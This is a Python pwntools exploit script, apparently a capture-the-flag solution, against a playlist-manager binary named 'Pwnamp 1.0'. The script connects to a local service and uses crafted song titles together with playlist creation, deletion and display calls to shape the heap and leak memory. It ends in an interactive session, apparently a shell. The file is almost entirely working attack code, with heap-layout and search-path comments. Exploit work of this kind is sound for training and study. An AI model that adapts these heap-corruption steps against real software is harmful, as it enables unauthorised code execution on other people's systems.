#!/usr/bin/env python3

from pwn import *

if False:
    io = process('../challenge/output/challenge')

if False:
    io = gdb.debug('../challenge/output/challenge', '''
    break *0x402676
    continue
    ''', level='debug')

TURBO = True

if True:
    io = remote('localhost', 31337)

def menu(io, choice):
    io.recvline_contains(b'Pwnamp 1.0 Menu')
    if not TURBO: io.recvuntil(b'> ')
    io.sendline(f'{choice}'.encode())

def add_song(io, artist: str, title: str, year: int):
    menu(io, 3)
    if not TURBO: io.recvuntil(b'Artist: ')
    io.sendline(artist.encode())
    if not TURBO: io.recvuntil(b'Title: ')
    io.sendline(title.encode())
    if not TURBO: io.recvuntil(b'Year: ')
    io.sendline(f'{year}'.encode())
    

def create_playlist(io, name: str, size: int, sort: int):
    menu(io, 7)
    if not TURBO: io.recvuntil(b'Playlist name: ')
    io.sendline(name.encode())
    if not TURBO: io.recvuntil(b'Size: ')
    io.sendline(f'{size}'.encode())
    if not TURBO: io.recvuntil(b'Sort playlist by:')
    if not TURBO: io.recvuntil(b'> ')
    io.sendline(f'{sort}'.encode())

def show_playlist(io, index: int):
    menu(io, 6)
    if not TURBO: io.recvuntil(b'Playlist index: ')
    io.sendline(f'{index}'.encode())

def delete_playlist(io, index: int):
    menu(io, 10)
    if not TURBO: io.recvuntil(b'Playlist index: ')
    io.sendline(f'{index}'.encode())

def add_song_to_playlist(io, song: int, playlist: int):
    menu(io, 8)
    if not TURBO: io.recvuntil(b'Song index: ')
    io.sendline(f'{song}'.encode())
    if not TURBO: io.recvuntil(b'Playlist index: ')
    io.sendline(f'{playlist}'.encode())

create_playlist(io, 'C', 16 * 4, 1)

add_song(io, 'pwn', 'YYYYYYYYYYYYYYY', 1337)
add_song(io, 'pwn', 'XYYYYYYYYYYYYYY', 1337)
add_song(io, 'pwn', 'XXYYYYYYYYYYYYY', 1337)
add_song(io, 'pwn', 'XXXYYYYYYYYYYYY', 1337)
add_song(io, 'pwn', 'XXXXYYYYYYYYYYY', 1337)
add_song(io, 'pwn', 'XXXXXYYYYYYYYYY', 1337)
add_song(io, 'pwn', 'XXXXXXYYYYYYYYY', 1337)
add_song(io, 'pwn', 'XXXXXXXYYYYYYYY', 1337)
add_song(io, 'pwn', 'XXXXXXXZYYYYYYY', 1337)
add_song(io, 'pwn', 'XXXXXXXZXYYYYYY', 1337)
add_song(io, 'pwn', 'XXXXXXXZXXYYYYY', 1337)
add_song(io, 'pwn', 'XXXXXXXZXXZYYYY', 1337)
add_song(io, 'pwn', 'XXXXXXXZXXZXYYY', 1337)
add_song(io, 'pwn', 'XXXXXXXZXXZXXYY', 1337)

TARGET_IDX = 1962

for _ in range(TARGET_IDX-29-1):
    add_song(io, 'pwn', 'pwn', 1337)

add_song(io, 'pwn', 'XXXXXXXZXXZXXZY', 1337)
add_song(io, 'pwn', 'XXXXXXXZXXZXXZX', 1337)

add_song_to_playlist(io, 16, 1)
add_song_to_playlist(io, 17, 1)
add_song_to_playlist(io, 18, 1)
add_song_to_playlist(io, 19, 1)
add_song_to_playlist(io, 20, 1)
add_song_to_playlist(io, 21, 1)
add_song_to_playlist(io, 22, 1)
add_song_to_playlist(io, 23, 1)
add_song_to_playlist(io, 24, 1)
add_song_to_playlist(io, 25, 1)
add_song_to_playlist(io, 26, 1)
add_song_to_playlist(io, 27, 1)
add_song_to_playlist(io, 28, 1)
add_song_to_playlist(io, 29, 1)
add_song_to_playlist(io, TARGET_IDX, 1)
add_song_to_playlist(io, TARGET_IDX+1, 1)

create_playlist(io, 'A', (16 * 0x100) - 3, 1)
create_playlist(io, 'B', (16 * 0x100) - 3, 1)
delete_playlist(io, 2)
#pause()
show_playlist(io, 1)

add_song_to_playlist(io, 0, 3)
add_song_to_playlist(io, 1, 3)
show_playlist(io, 3)

# 0x8090
# R 0x4048
# L 0x2023
# L 0x1011
# R 0x808
# L 0x403
# L 0x201
# R 0x100
# L 0x7f
# L 0x3f
# L 0x1f
# L 0xf
# L 7
# L 3
# L 1
# 0


io.interactive()

"""

N = 128

[playlist 0x100 * 128]
[playlist 0x100 * 128][playlist 0x100 * 128]
[                    ][playlist 0x100 * 128]
[sorter 0x100 * 128  ][playlist 0x100 * 128]


"""
